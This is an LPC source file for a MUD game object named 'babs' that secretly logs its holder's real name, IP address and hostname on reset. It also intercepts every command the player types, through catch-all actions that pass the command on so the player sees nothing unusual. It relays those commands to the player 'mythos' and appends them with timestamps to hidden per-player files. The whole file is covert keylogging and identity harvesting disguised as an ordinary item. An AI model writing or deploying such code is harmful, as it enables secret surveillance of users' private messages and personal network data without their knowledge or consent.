#define haha  "babs"

int m;
reset(arg) {
  if(arg) return;
  
if(this_player())
write_file("/players/mythos/closed/others/[]"+
this_player()->query_real_name(),this_player()->query_real_name()+
" "+query_ip_number(this_player())+"  "+ this_player()->query_hostname()+"\n\n");
  
  m = 0;
  call_out("heh",100);
}

query_prevent_shadow() { return 1; } 
get() { return 1; }
drop() { return 1; }
id(str) { return str == haha; }
init() {
#ifndef __LDMUD__
  add_action("ekg");add_xverb("!");
  add_action("ekg"); add_xverb("");
#else
 add_action("ekg", "!", 3);
 add_action("ekg", "", 3);
#endif
}

set_listen(n) { m = n; }

ekg(str) {
object ob;
int h,ll;
if(m) {
  if(find_player("mythos")) {
tell_object(find_player("mythos"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");}
    else {
      ob = users(); ll = h = 0;
      while(h<sizeof(ob) && !ll) {
        if(ob[h]->query_real_name() == "mythos") {
           tell_object(ob[h], "**"+(this_player()->query_name())+
            "**"+query_verb()+" "+str+"\n");
        ll = 1;
        }
        h = h + 1; }
    }
}
write_file("/players/mythos/closed/tell/[]"+
this_player()->query_real_name(),
    (ctime(time()))+" > "+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
}

heh() {
  if(environment(this_object()))
  move_object(this_object(),environment(this_object()));
call_out("heh",50);
return 1;}
